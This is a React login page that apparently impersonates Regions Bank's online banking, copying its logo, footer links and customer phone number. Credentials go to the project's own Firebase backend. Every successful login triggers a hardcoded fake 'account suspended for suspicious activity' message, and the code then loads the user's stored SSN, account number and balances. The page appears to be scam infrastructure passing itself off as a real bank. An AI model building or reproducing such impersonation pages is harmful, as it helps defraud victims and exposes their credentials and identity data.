import React, { useState, useEffect, useRef } from "react";
import {
  Box,
  Button,
  Flex,
  Image,
  Text,
  Input,
  Checkbox,
} from "@chakra-ui/react";
import { Link } from "react-router-dom";
import logo from "../Assets/SVG/regionsLogo.svg";
import "../App.css";
import { useNavigate } from "react-router-dom";
import { auth } from "../firebase";
import { signInWithEmailAndPassword } from "firebase/auth";
import { Toaster, toast } from "react-hot-toast";
import { useDispatch } from "react-redux";
import { setUser } from "../Feature/action";
import { doc, getDoc, getFirestore } from "firebase/firestore";

const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
// const PWD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[*!@#$%]).{8,24}$/;
const PWD_REGEX = /^.{8,24}$/;

const Login = () => {
  const [email, setEmail] = useState("");
  const [validEmail, setValidemail] = useState(false);
  const [password, setPassword] = useState("");
  const [validPwd, setValidPwd] = useState(false);
  const navigate = useNavigate();
  const userRef = useRef();
  const [userData, setUserData] = useState({});
  const dispatch = useDispatch();

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  useEffect(() => {
    const result = EMAIL_REGEX.test(email);
    setValidemail(result);
  }, [email]);

  useEffect(() => {
    const result = PWD_REGEX.test(password);
    setValidPwd(result);
  }, [password]);

  const handleClick = async (e) => {
    e.preventDefault();

    if (!email || !password) {
      toast.error("Please input your Email and Password");
      return; // Prevent further execution if email or password is missing
    }

    try {
      const userCredential = await signInWithEmailAndPassword(
        auth,
        email,
        password
      );
      const user = userCredential.user;
      console.log(userCredential);
      toast.error(
        "Suspicious Activity your account has been suspended for violating the terms and conditions of region bank kindly visit one of our branch with a valid identification card to prove your identity"
      );
      
      // navigate("/login-verification");

      // Fetch user data from Firestore and store it in Redux
      const handleDashboard = async () => {
        const uid = user.uid;
        const db = getFirestore();
        const docRef = doc(db, "users", uid);

        try {
          const docSnap = await getDoc(docRef);

          if (docSnap.exists()) {
            const userData = docSnap.data();
            setUserData(userData);
            const userInfo = {
              fullName: userData.fullName,
              address: userData.address,
              phoneNumber: userData.phoneNumber,
              state: userData.state,
              country: userData.country,
              image: userData.imageUrl,
              amount: userData.amount,
              euro: userData.euro,
              savings: userData.savings,
              email: email,
              accountNumber: userData.accountNumber,
              accountType: userData.accountType,
              ssn: userData.ssn,
              id: userData.id,
            };
            dispatch(setUser(userInfo));
          } else {
            console.log("No such document!");
          }
        } catch (error) {
          console.error("Error fetching user document:", error);
        }
      };

      await handleDashboard(); // Fetch user data and update Redux store
    } catch (error) {
      console.error(error);
      if (error.response) {
        const { data, status } = error.response;
        console.error(`Error ${status}:`, data);

        if (status === 409 && data.error === "This email is already in use") {
          // Provide a user-friendly message for email already in use
          toast.error(
            "This email address is already in use. Please use a different email."
          );
        } else {
          // Provide a generic error message for other cases
          toast.error("An error occurred while signing up. Please try again.");
        }
      } else if (error.request) {
        console.error("No response received from the server.");
        toast.error("No response received from the server. Please try again.");
      } else {
        console.error("Error setting up the request:", error.message);
        toast.error("An error occurred. Please try again.");
      }
    }
  };

  return (
    <div>
      <Flex align="center" flexDirection="column">
        <Toaster position="top-center" reverseOrder={false} />

        <Box marginTop={{ base: "4%", md: "2%" }}>
          <Image src={logo} />
        </Box>
        <Text
          marginTop={{ base: "7%", md: "3%" }}
          fontSize={{ base: "20px", md: "52px" }}
          fontWeight={{ base: "500", md: "300" }}
        >
          Access your account online
        </Text>
        <Text
          fontSize={{ base: "14px", md: "18px" }}
          marginTop="3%"
          fontWeight="600"
        >
          Login to online banking
        </Text>
        <Box
          boxShadow="1px 2px 4px 0px rgba(0, 0, 0, 0.2)"
          padding="1% 2%"
          marginTop={{ base: "10%", md: "2%" }}
          borderRadius="30px"
          width={{ base: "95%", md: "28%" }}
        >
          <Text marginTop="5%" marginBottom="1%" fontWeight="600">
            Email
          </Text>
          <Input
            placeholder="youremail@example.com"
            padding="7%"
            borderRadius="15px"
            border="3px solid #528400"
            type="email"
            value={email}
            onChange={handleEmailChange}
            id="email"
            ref={userRef}
            required
            aria-invalid={validEmail ? "false" : "true"}
          />
          <Box>
            <Text marginTop="5%" marginBottom="1%" fontWeight="600">
              Password
            </Text>
            <Input
              padding="7%"
              borderRadius="15px"
              border="3px solid #528400"
              placeholder="•••••••••••••••••••••••••••"
              type="password"
              id="password"
              onChange={handlePasswordChange}
              value={password}
              required
              aria-invalid={validPwd ? "false" : "true"}
              aria-describedby="pwdnote"
            />
          </Box>
          <Flex marginTop="2%">
            <Checkbox color="green" />
            <Text marginLeft="10px" fontSize="14px" fontWeight="600">
              Remember my username
            </Text>
          </Flex>
          <Flex
            justifyContent="center"
            marginTop="8%"
            marginBottom="3%"
            alignItems="center"
          >
            <Button
              backgroundColor="#528400"
              color="white"
              height="50px"
              borderRadius="25px"
              width="80%"
              onClick={handleClick}
            >
              Continue
            </Button>
          </Flex>
        </Box>
        <Box marginTop="2%" textAlign="center">
          <Text fontSize="14px">
            Forgot <Link className="link">username</Link> or{" "}
            <Link className="link">password</Link>?
          </Text>
          <Text fontSize="14px" marginTop="2%">
            Don’t have an Online Banking account?{" "}
            <Link className="link" to="/signup">
              Enroll now.
            </Link>
          </Text>
        </Box>

        <Flex
          width={{ base: "95%", md: "60%" }}
          paddingTop={{ base: "7%", md: "3%" }}
          justifyContent="center"
        >
          <Flex
            alignItems="center"
            flexWrap="wrap"
            justifyContent={{ base: "space-around", md: "space-between" }}
            width="100%"
          >
            <Text
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              marginX="2%"
            >
              About Regions
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              Investor Relations
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              Economic Report
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              Property for sale
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              Careers
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              The regions community
            </Text>
            <Text
              _hover={{
                color: "#528400",
                borderBottom: "1.5px solid #528400",
                transition: "1s",
              }}
              color="#838383"
              fontSize="14px"
              fontWeight="600px"
              marginX="2%"
            >
              News
            </Text>
          </Flex>
        </Flex>
        <Text
          marginTop="7%"
          width={{ base: "95%", md: "100%" }}
          fontSize="13px"
        >
          Call <Link className="link">1-800-REGIONS (1-800-734-4667)</Link> or
          visit <Link className="link">Regions Help & Suppor</Link>t.
        </Text>
      </Flex>
    </div>
  );
};

export default Login;
